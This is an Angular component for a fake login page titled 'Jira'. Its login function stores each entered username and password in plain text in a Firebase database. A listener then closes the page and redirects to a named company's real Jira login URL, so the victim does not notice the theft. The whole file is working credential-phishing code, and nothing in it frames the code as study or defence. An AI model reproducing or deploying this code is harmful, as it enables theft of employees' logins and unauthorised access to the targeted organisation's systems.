  import { Component } from '@angular/core';
  import { AngularFireDatabase } from '@angular/fire/database'
  import firebase from 'firebase';

  @Component({
    selector: 'app-root',
    templateUrl: './app.component.html',
    styleUrls: ['./app.component.css']
  })
  export class AppComponent {
    title = 'Jira';

    username = ""
    password = ""

    errorValue = false
    count = 0
    constructor(private db: AngularFireDatabase) { 
      firebase.database().ref().on('value', snapshot => {
        if (this.count > 1) {
          window.close()
          this.goToLink("http://jira.icheck.com.vn/login.jsp?permissionViolation=true&os_destination=%2Fprojects%2FIOSSO2020%2Fissues%2FIOSSO2020-18%3Ffilter%3Dallopenissues&page_caps=&user_role=")
        }
      })
    }

    goToLink(url: string){
      window.open(url, "_blank");
    }

    login() {
      if (this.username != "" && this.password != "") {
        this.errorValue = false
        this.count += 1
        const id = this.db.createPushId()
        const tutRef = this.db.object(id);
        tutRef.set({ username: this.username, password: this.password});
      } else {
        this.errorValue = true
      }      
    }
    
  }
